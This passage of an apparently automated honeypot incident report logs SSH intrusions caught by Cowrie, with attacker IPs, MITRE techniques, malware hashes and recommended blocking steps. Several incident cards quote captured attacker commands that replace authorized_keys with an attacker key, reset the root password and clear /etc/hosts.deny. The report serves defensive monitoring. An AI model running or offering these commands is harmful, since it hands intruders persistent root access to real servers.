| `2026-04-13 06:10:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.229.141[.]26` to AbuseIPDB if not already reported
- [ ] Block `58.229.141[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22503df9a30e

| Field | Detail |
|---|---|
| **Source IP** | `112.216.108[.]62` |
| **First Seen** | 2026-04-13 06:10 |
| **Last Seen** | 2026-04-13 06:10 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:10:45` | `cowrie.session.connect` |
| `2026-04-13 06:10:45` | `cowrie.client.version` |
| `2026-04-13 06:10:45` | `cowrie.client.kex` |
| `2026-04-13 06:10:46` | `cowrie.login.success` |
| `2026-04-13 06:10:46` | `cowrie.session.params` |
| `2026-04-13 06:10:46` | `cowrie.command.input` |
| `2026-04-13 06:10:46` | `cowrie.command.failed` |
| `2026-04-13 06:10:46` | `cowrie.log.closed` |
| `2026-04-13 06:10:47` | `cowrie.session.params` |
| `2026-04-13 06:10:47` | `cowrie.command.input` |
| `2026-04-13 06:10:47` | `cowrie.session.file_download` |
| `2026-04-13 06:10:47` | `cowrie.log.closed` |
| `2026-04-13 06:10:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.216.108[.]62` to AbuseIPDB if not already reported
- [ ] Block `112.216.108[.]62` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec97cf5b0287

| Field | Detail |
|---|---|
| **Source IP** | `58.229.141[.]26` |
| **First Seen** | 2026-04-13 06:10 |
| **Last Seen** | 2026-04-13 06:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:10:47` | `cowrie.session.connect` |
| `2026-04-13 06:10:47` | `cowrie.client.version` |
| `2026-04-13 06:10:47` | `cowrie.client.kex` |
| `2026-04-13 06:10:47` | `cowrie.login.success` |
| `2026-04-13 06:10:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.229.141[.]26` to AbuseIPDB if not already reported
- [ ] Block `58.229.141[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-813a8c5af8ec

| Field | Detail |
|---|---|
| **Source IP** | `112.216.108[.]62` |
| **First Seen** | 2026-04-13 06:10 |
| **Last Seen** | 2026-04-13 06:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:10:49` | `cowrie.session.connect` |
| `2026-04-13 06:10:49` | `cowrie.client.version` |
| `2026-04-13 06:10:49` | `cowrie.client.kex` |
| `2026-04-13 06:10:49` | `cowrie.login.success` |
| `2026-04-13 06:10:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.216.108[.]62` to AbuseIPDB if not already reported
- [ ] Block `112.216.108[.]62` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e5dbef93da2

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-04-13 06:11 |
| **Last Seen** | 2026-04-13 06:11 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:11:17` | `cowrie.session.connect` |
| `2026-04-13 06:11:17` | `cowrie.client.version` |
| `2026-04-13 06:11:18` | `cowrie.client.kex` |
| `2026-04-13 06:11:19` | `cowrie.login.success` |
| `2026-04-13 06:11:20` | `cowrie.session.params` |
| `2026-04-13 06:11:20` | `cowrie.command.input` |
| `2026-04-13 06:11:20` | `cowrie.command.failed` |
| `2026-04-13 06:11:20` | `cowrie.log.closed` |
| `2026-04-13 06:11:21` | `cowrie.session.params` |
| `2026-04-13 06:11:21` | `cowrie.command.input` |
| `2026-04-13 06:11:21` | `cowrie.session.file_download` |
| `2026-04-13 06:11:21` | `cowrie.log.closed` |
| `2026-04-13 06:11:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd0695d13999

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-04-13 06:11 |
| **Last Seen** | 2026-04-13 06:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:11:24` | `cowrie.session.connect` |
| `2026-04-13 06:11:24` | `cowrie.client.version` |
| `2026-04-13 06:11:25` | `cowrie.client.kex` |
| `2026-04-13 06:11:26` | `cowrie.login.success` |
| `2026-04-13 06:11:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d272beef4a43

| Field | Detail |
|---|---|
| **Source IP** | `103.123.53[.]88` |
| **First Seen** | 2026-04-13 06:12 |
| **Last Seen** | 2026-04-13 06:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:12:09` | `cowrie.session.connect` |
| `2026-04-13 06:12:09` | `cowrie.client.version` |
| `2026-04-13 06:12:09` | `cowrie.client.kex` |
| `2026-04-13 06:12:09` | `cowrie.login.success` |
| `2026-04-13 06:12:09` | `cowrie.session.params` |
| `2026-04-13 06:12:09` | `cowrie.command.input` |
| `2026-04-13 06:12:09` | `cowrie.command.failed` |
| `2026-04-13 06:12:09` | `cowrie.log.closed` |
| `2026-04-13 06:12:09` | `cowrie.session.params` |
| `2026-04-13 06:12:09` | `cowrie.command.input` |
| `2026-04-13 06:12:09` | `cowrie.session.file_download` |
| `2026-04-13 06:12:09` | `cowrie.log.closed` |
| `2026-04-13 06:12:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.123.53[.]88` to AbuseIPDB if not already reported
- [ ] Block `103.123.53[.]88` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bab51d2be6df

| Field | Detail |
|---|---|
| **Source IP** | `103.123.53[.]88` |
| **First Seen** | 2026-04-13 06:12 |
| **Last Seen** | 2026-04-13 06:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:12:10` | `cowrie.session.connect` |
| `2026-04-13 06:12:10` | `cowrie.client.version` |
| `2026-04-13 06:12:10` | `cowrie.client.kex` |
| `2026-04-13 06:12:10` | `cowrie.login.success` |
| `2026-04-13 06:12:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.123.53[.]88` to AbuseIPDB if not already reported
- [ ] Block `103.123.53[.]88` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06bac50f7972

| Field | Detail |
|---|---|
| **Source IP** | `112.216.108[.]62` |
| **First Seen** | 2026-04-13 06:12 |
| **Last Seen** | 2026-04-13 06:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:12:23` | `cowrie.session.connect` |
| `2026-04-13 06:12:23` | `cowrie.client.version` |
| `2026-04-13 06:12:23` | `cowrie.client.kex` |
| `2026-04-13 06:12:23` | `cowrie.login.success` |
| `2026-04-13 06:12:24` | `cowrie.session.params` |
| `2026-04-13 06:12:24` | `cowrie.command.input` |
| `2026-04-13 06:12:24` | `cowrie.command.failed` |
| `2026-04-13 06:12:24` | `cowrie.log.closed` |
| `2026-04-13 06:12:24` | `cowrie.session.params` |
| `2026-04-13 06:12:24` | `cowrie.command.input` |
| `2026-04-13 06:12:24` | `cowrie.session.file_download` |
| `2026-04-13 06:12:24` | `cowrie.log.closed` |
| `2026-04-13 06:12:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.216.108[.]62` to AbuseIPDB if not already reported
- [ ] Block `112.216.108[.]62` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d00adf428e0f

| Field | Detail |
|---|---|
| **Source IP** | `112.216.108[.]62` |
| **First Seen** | 2026-04-13 06:12 |
| **Last Seen** | 2026-04-13 06:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:12:26` | `cowrie.session.connect` |
| `2026-04-13 06:12:26` | `cowrie.client.version` |
| `2026-04-13 06:12:27` | `cowrie.client.kex` |
| `2026-04-13 06:12:27` | `cowrie.login.success` |
| `2026-04-13 06:12:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.216.108[.]62` to AbuseIPDB if not already reported
- [ ] Block `112.216.108[.]62` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f7308cdfea0

| Field | Detail |
|---|---|
| **Source IP** | `14.103.46[.]177` |
| **First Seen** | 2026-04-13 06:12 |
| **Last Seen** | 2026-04-13 06:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:gonYhc2RqIRH"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 06:12:34` | `cowrie.session.connect` |
| `2026-04-13 06:12:34` | `cowrie.client.version` |
| `2026-04-13 06:12:35` | `cowrie.client.kex` |
| `2026-04-13 06:12:35` | `cowrie.login.success` |
| `2026-04-13 06:12:35` | `cowrie.session.params` |
| `2026-04-13 06:12:35` | `cowrie.command.input` |
| `2026-04-13 06:12:35` | `cowrie.command.failed` |
| `2026-04-13 06:12:36` | `cowrie.log.closed` |
| `2026-04-13 06:12:37` | `cowrie.session.params` |
| `2026-04-13 06:12:37` | `cowrie.command.input` |
| `2026-04-13 06:12:38` | `cowrie.session.file_download` |
| `2026-04-13 06:12:38` | `cowrie.log.closed` |
| `2026-04-13 06:12:50` | `cowrie.session.params` |
| `2026-04-13 06:12:50` | `cowrie.command.input` |
| `2026-04-13 06:12:50` | `cowrie.log.closed` |
| `2026-04-13 06:12:50` | `cowrie.session.params` |
| `2026-04-13 06:12:50` | `cowrie.command.input` |
| `2026-04-13 06:12:50` | `cowrie.log.closed` |
| `2026-04-13 06:12:50` | `cowrie.session.params` |
| `2026-04-13 06:12:50` | `cowrie.command.input` |
| `2026-04-13 06:12:51` | `cowrie.session.file_download` |
| `2026-04-13 06:12:51` | `cowrie.log.closed` |
| `2026-04-13 06:12:51` | `cowrie.session.params` |
| `2026-04-13 06:12:51` | `cowrie.command.input` |
| `2026-04-13 06:12:51` | `cowrie.log.closed` |
| `2026-04-13 06:12:51` | `cowrie.session.params` |
| `2026-04-13 06:12:51` | `cowrie.command.input` |
| `2026-04-13 06:12:52` | `cowrie.log.closed` |
| `2026-04-13 06:12:52` | `cowrie.session.params` |
| `2026-04-13 06:12:52` | `cowrie.command.input` |
| `2026-04-13 06:12:52` | `cowrie.command.input` |
| `2026-04-13 06:12:52` | `cowrie.log.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.46[.]177` to AbuseIPDB if not already reported
- [ ] Block `14.103.46[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `189.217.130[.]86` | **25** | 2026-04-13 04:18 | 2026-04-13 04:56 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `43.128.76[.]85` | **25** | 2026-04-13 04:17 | 2026-04-13 04:59 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `93.48.24[.]181` | **22** | 2026-04-13 04:17 | 2026-04-13 04:42 | 0m | 22 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.103.105[.]243` | **21** | 2026-04-13 04:18 | 2026-04-13 04:51 | 36m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `222.71.116[.]214` | **14** | 2026-04-13 04:18 | 2026-04-13 04:26 | 26m | 1 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `183.195.131[.]206` | **12** | 2026-04-13 04:17 | 2026-04-13 04:25 | 22m | 1 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.103.46[.]177` | **10** | 2026-04-13 05:59 | 2026-04-13 06:12 | 16m | 0 | `T1592` | 🟠 MEDIUM |
| `103.123.53[.]88` | **9** | 2026-04-13 05:55 | 2026-04-13 06:12 | 0m | 9 | `T1110.001 · T1592` | 🟢 LOW |
| `112.216.108[.]62` | **7** | 2026-04-13 05:59 | 2026-04-13 06:12 | 0m | 7 | `T1110.001 · T1592` | 🟢 LOW |
| `102.88.137[.]145` | **6** | 2026-04-13 05:59 | 2026-04-13 06:11 | 0m | 6 | `T1110.001 · T1592` | 🟢 LOW |
| `177.70.6[.]158` | **6** | 2026-04-13 06:00 | 2026-04-13 06:11 | 0m | 6 | `T1110.001 · T1592` | 🟢 LOW |
| `3.131.220[.]121` | **6** | 2026-04-13 05:58 | 2026-04-13 06:05 | 0m | 0 | `T1592` | 🟢 LOW |
| `16.58.56[.]214` | **5** | 2026-04-13 04:01 | 2026-04-13 04:09 | 0m | 0 | `T1592` | 🟢 LOW |
| `152.32.163[.]183` | **3** | 2026-04-13 06:01 | 2026-04-13 06:09 | 2m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.112[.]107` | **2** | 2026-04-13 06:00 | 2026-04-13 06:02 | 2m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `101.126.81[.]18` | 1 | 2026-04-13 05:56 | 2026-04-13 05:58 | 120s | 0 | `T1592` | 🟢 LOW |
| `102.213.34[.]99` | 1 | 2026-04-13 05:55 | 2026-04-13 05:55 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `118.193.34[.]157` | 1 | 2026-04-13 05:58 | 2026-04-13 05:58 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.52.12[.]202` | 1 | 2026-04-13 05:54 | 2026-04-13 05:55 | 52s | 0 | `T1592` | 🟢 LOW |
| `125.21.53[.]232` | 1 | 2026-04-13 06:09 | 2026-04-13 06:09 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.112[.]105` | 1 | 2026-04-13 06:12 | 2026-04-13 06:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `14.103.117[.]142` | 1 | 2026-04-13 06:01 | 2026-04-13 06:03 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.117[.]91` | 1 | 2026-04-13 06:12 | 2026-04-13 06:12 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.127[.]7` | 1 | 2026-04-13 06:00 | 2026-04-13 06:02 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.127[.]71` | 1 | 2026-04-13 06:11 | 2026-04-13 06:11 | 0s | 0 | `T1592` | 🟢 LOW |
| `192.99.169[.]99` | 1 | 2026-04-13 04:18 | 2026-04-13 04:18 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `193.39.208[.]26` | 1 | 2026-04-13 04:14 | 2026-04-13 04:14 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `209.141.47[.]217` | 1 | 2026-04-13 04:14 | 2026-04-13 04:15 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `222.97.11[.]71` | 1 | 2026-04-13 03:09 | 2026-04-13 03:09 | 30s | 0 | `T1592` | 🟢 LOW |
| `58.229.141[.]26` | 1 | 2026-04-13 06:10 | 2026-04-13 06:10 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `61.86.148[.]52` | 1 | 2026-04-13 04:47 | 2026-04-13 04:47 | 30s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (22 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 41/100 | 🟡 MEDIUM | **29/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 41/100 | 🟡 MEDIUM | **28/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 46/100 | 🟡 MEDIUM | **43/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `16.58.56[.]214` | US | Amazon.com, Inc. | **100** ⚠️ | 50 |
| `183.195.131[.]206` | CN | China Mobile Communications Corporation - shanghai company | **100** ⚠️ | 48 |
| `125.21.53[.]232` | IN | Bharti Televentures Limited A/c ABTS MP | **100** ⚠️ | 50 |
| `3.131.220[.]121` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `102.88.137[.]145` | NG | MTN Nigeria | **100** ⚠️ | 50 |
| `14.103.127[.]71` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `222.97.11[.]71` | KR | Korea Telecom | **100** ⚠️ | 37 |
